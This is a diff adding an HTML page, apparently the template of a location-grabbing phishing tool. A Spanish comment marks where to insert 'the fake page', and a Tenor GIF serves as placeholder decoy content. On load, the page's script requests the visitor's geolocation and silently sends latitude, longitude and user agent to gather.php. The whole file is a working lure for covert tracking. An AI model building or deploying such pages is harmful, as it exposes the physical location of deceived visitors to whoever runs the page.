@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+<!-- Reemplaza la siguiente linea con la pagina falsa -->
+    <div class="tenor-gif-embed" data-postid="21546851" data-share-method="host" data-aspect-ratio="1" data-width="40%"><a href="https://tenor.com/view/uwu-owo-baka-lol-xd-gif-21546851">Uwu Owo GIF</a>from <a href="https://tenor.com/search/uwu-gifs">Uwu GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+    
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(takePosition);
+  } else { 
+    x.innerHTML = "La geolocalización no está disponible en este navegador";
+  }
+}
+
+function takePosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "gather.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+  xhttp.send();
+}
+</script>
+
+</body>
+</html>
